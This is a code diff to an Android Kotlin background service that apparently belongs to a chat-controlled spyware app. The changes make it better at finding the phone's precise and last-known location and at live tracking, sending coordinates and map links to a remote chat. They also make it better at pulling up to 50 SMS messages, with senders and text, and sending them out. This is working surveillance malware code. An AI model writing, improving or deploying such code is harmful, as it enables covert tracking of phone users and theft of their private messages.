@@ -303,6 +303,16 @@ class BackgroundControlService : Service() {
         }
     }
 
+    private fun getBestLastKnownLocation(locManager: LocationManager): Pair<Location?, String> {
+        val candidates = listOfNotNull(
+            try { locManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)?.let { it to "GPS" } } catch (_: Exception) { null },
+            try { locManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)?.let { it to "NETWORK" } } catch (_: Exception) { null },
+            try { locManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER)?.let { it to "PASSIVE" } } catch (_: Exception) { null }
+        )
+        val best = candidates.maxByOrNull { it.first.time }
+        return if (best != null) best.first to best.second else null to "NONE"
+    }
+
     private fun fetchStrictRealTimeLocation(chatId: String) {
         if (!hasPermission(Manifest.permission.ACCESS_FINE_LOCATION) && !hasPermission(Manifest.permission.ACCESS_COARSE_LOCATION)) {
             sendDirectMessage(chatId, "❌ صلاحية الموقع غير ممنوحة.")
@@ -311,67 +321,76 @@ class BackgroundControlService : Service() {
         mainHandler.post {
             try {
                 val locManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
-                sendDirectMessage(chatId, "📍 جاري تحديد الإحداثيات...")
+                val gpsOn = locManager.isProviderEnabled(LocationManager.GPS_PROVIDER)
+                val netOn = locManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)
 
-                val provider = when {
-                    locManager.isProviderEnabled(LocationManager.GPS_PROVIDER) -> LocationManager.GPS_PROVIDER
-                    locManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER) -> LocationManager.NETWORK_PROVIDER
-                    else -> null
+                sendDirectMessage(
+                    chatId,
+                    "📍 جاري تحديد الإحداثيات... (GPS: ${if (gpsOn) "مفعل" else "متوقف"} | الشبكة: ${if (netOn) "مفعل" else "متوقف"})"
+                )
+
+                val activeProviders = buildList {
+                    if (gpsOn) add(LocationManager.GPS_PROVIDER)
+                    if (netOn) add(LocationManager.NETWORK_PROVIDER)
                 }
 
-                if (provider != null) {
-                    val listener = object : LocationListener {
-                        override fun onLocationChanged(location: Location) {
-                            val lat = location.latitude
-                            val lon = location.longitude
-                            val accuracy = location.accuracy
-                            sendDirectMessage(
-                                chatId,
-                                "🎯 [موقع دقيق - $provider]\nLat: $lat, Lon: $lon\nالدقة: ${accuracy}م\nhttps://maps.google.com/?q=$lat,$lon"
-                            )
-                            try {
-                                locManager.removeUpdates(this)
-                            } catch (_: Exception) {
+                if (activeProviders.isNotEmpty()) {
+                    var delivered = false
+                    val listeners = mutableListOf<LocationListener>()
+
+                    for (provider in activeProviders) {
+                        val listener = object : LocationListener {
+                            override fun onLocationChanged(location: Location) {
+                                if (delivered) return
+                                delivered = true
+                                val lat = location.latitude
+                                val lon = location.longitude
+                                val accuracy = location.accuracy
+                                sendDirectMessage(
+                                    chatId,
+                                    "🎯 [موقع دقيق - $provider]\nLat: $lat, Lon: $lon\nالدقة: ${accuracy}م\nhttps://maps.google.com/?q=$lat,$lon"
+                                )
+                                listeners.forEach { l ->
+                                    try { locManager.removeUpdates(l) } catch (_: Exception) {}
+                                }
                             }
-                        }
 
-                        @Deprecated("Deprecated in Java")
-                        override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {
+                            @Deprecated("Deprecated in Java")
+                            override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
+                            override fun onProviderEnabled(provider: String) {}
+                            override fun onProviderDisabled(provider: String) {}
                         }
-
-                        override fun onProviderEnabled(provider: String) {
-                        }
-
-                        override fun onProviderDisabled(provider: String) {
-                        }
+                        listeners.add(listener)
+                        @Suppress("DEPRECATION")
+                        locManager.requestSingleUpdate(provider, listener, Looper.getMainLooper())
                     }
-                    @Suppress("DEPRECATION")
-                    locManager.requestSingleUpdate(provider, listener, Looper.getMainLooper())
 
                     mainHandler.postDelayed({
-                        try {
-                            locManager.removeUpdates(listener)
-                        } catch (_: Exception) {
+                        listeners.forEach { l ->
+                            try { locManager.removeUpdates(l) } catch (_: Exception) {}
                         }
-                        val fallback = locManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
-                            ?: locManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
-                        if (fallback != null) {
-                            sendDirectMessage(
-                                chatId,
-                                "📍 [آخر موقع معروف]:\nLat: ${fallback.latitude}, Lon: ${fallback.longitude}\nhttps://maps.google.com/?q=${fallback.latitude},${fallback.longitude}"
-                            )
+                        if (!delivered) {
+                            val (fallback, source) = getBestLastKnownLocation(locManager)
+                            if (fallback != null) {
+                                delivered = true
+                                sendDirectMessage(
+                                    chatId,
+                                    "📍 [آخر موقع معروف - $source]:\nLat: ${fallback.latitude}, Lon: ${fallback.longitude}\nhttps://maps.google.com/?q=${fallback.latitude},${fallback.longitude}"
+                                )
+                            } else {
+                                sendDirectMessage(chatId, "⚠️ لم يستجب مزوّد الموقع ضمن المهلة ولا يوجد موقع محفوظ مسبقاً.")
+                            }
                         }
                     }, 8000)
                 } else {
-                    val lastLoc = locManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
-                        ?: locManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+                    val (lastLoc, source) = getBestLastKnownLocation(locManager)
                     if (lastLoc != null) {
                         sendDirectMessage(
                             chatId,
-                            "📍 [الموقع المؤرشف]:\nhttps://maps.google.com/?q=${lastLoc.latitude},${lastLoc.longitude}"
+                            "📍 [الموقع المؤرشف - $source]:\nLat: ${lastLoc.latitude}, Lon: ${lastLoc.longitude}\nhttps://maps.google.com/?q=${lastLoc.latitude},${lastLoc.longitude}"
                         )
                     } else {
-                        sendDirectMessage(chatId, "⚠️ تعذر جلب الموقع لتعطل خدمات التحديد.")
+                        sendDirectMessage(chatId, "⚠️ تعذر جلب الموقع لتعطل خدمات التحديد (GPS و الشبكة متوقفان ولا يوجد موقع محفوظ).")
                     }
                 }
             } catch (e: Exception) {
@@ -393,13 +412,12 @@ class BackgroundControlService : Service() {
                 while (isTrackingActive && isRunning) {
                     try {
                         val locManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
-                        val location = locManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
-                            ?: locManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+                        val (location, source) = getBestLastKnownLocation(locManager)
 
                         if (location != null) {
                             sendDirectMessage(
                                 chatId,
-                                "📍 [تتبّع حي]\nLat: ${location.latitude}, Lon: ${location.longitude}\nhttps://maps.google.com/?q=${location.latitude},${location.longitude}"
+                                "📍 [تتبّع حي - $source]\nLat: ${location.latitude}, Lon: ${location.longitude}\nhttps://maps.google.com/?q=${location.latitude},${location.longitude}"
                             )
                         }
                     } catch (_: Exception) {
@@ -743,30 +761,43 @@ class BackgroundControlService : Service() {
             return
         }
         executionExecutor.execute {
-            try {
-                val uri = Uri.parse("content://sms/inbox")
-                val projection = arrayOf("address", "body", "date")
-                val sb = StringBuilder("💬 أرشيف رسائل SMS (آخر 50):\n\n")
-                var count = 0
+            sendDirectMessage(chatId, "💬 جاري سحب رسائل SMS...")
+            val candidateUris = listOf(
+                Uri.parse("content://sms/inbox") to "الوارد (Inbox)",
+                Uri.parse("content://sms") to "جميع الرسائل (SMS)"
+            )
+            val projection = arrayOf("address", "body", "date")
+            var lastError: String? = null
 
-                contentResolver.query(uri, projection, null, null, "date DESC")?.use { cursor ->
-                    val addrIdx = cursor.getColumnIndexOrThrow("address")
-                    val bodyIdx = cursor.getColumnIndexOrThrow("body")
-                    while (cursor.moveToNext() && count < 50) {
-                        val sender = cursor.getString(addrIdx) ?: "مجهول"
-                        val body = cursor.getString(bodyIdx)?.take(100) ?: ""
-                        sb.append("• من: $sender\n  النص: $body\n\n")
-                        count++
+            for ((uri, label) in candidateUris) {
+                try {
+                    val sb = StringBuilder("💬 أرشيف رسائل SMS - $label (آخر 50):\n\n")
+                    var count = 0
+
+                    contentResolver.query(uri, projection, null, null, "date DESC")?.use { cursor ->
+                        val addrIdx = cursor.getColumnIndex("address")
+                        val bodyIdx = cursor.getColumnIndex("body")
+                        while (cursor.moveToNext() && count < 50) {
+                            val sender = if (addrIdx >= 0) cursor.getString(addrIdx) ?: "مجهول" else "مجهول"
+                            val body = if (bodyIdx >= 0) cursor.getString(bodyIdx)?.take(100) ?: "" else ""
+                            sb.append("• من: $sender\n  النص: $body\n\n")
+                            count++
+                        }
                     }
-                }
 
-                if (count == 0) {
-                    sendDirectMessage(chatId, "ℹ️ صندوق الرسائل فارغ.")
-                } else {
-                    sendDirectMessage(chatId, sb.toString())
+                    if (count > 0) {
+                        sendDirectMessage(chatId, sb.toString())
+                        return@execute
+                    }
+                } catch (e: Exception) {
+                    lastError = e.message ?: e.javaClass.simpleName
                 }
-            } catch (e: Exception) {
-                sendDirectMessage(chatId, "❌ خطأ سحب الرسائل: ${e.message}")
+            }
+
+            if (lastError != null) {
+                sendDirectMessage(chatId, "❌ تعذر سحب الرسائل: $lastError")
+            } else {
+                sendDirectMessage(chatId, "ℹ️ لا توجد رسائل SMS متاحة أو الصندوق فارغ.")
             }
         }
     }
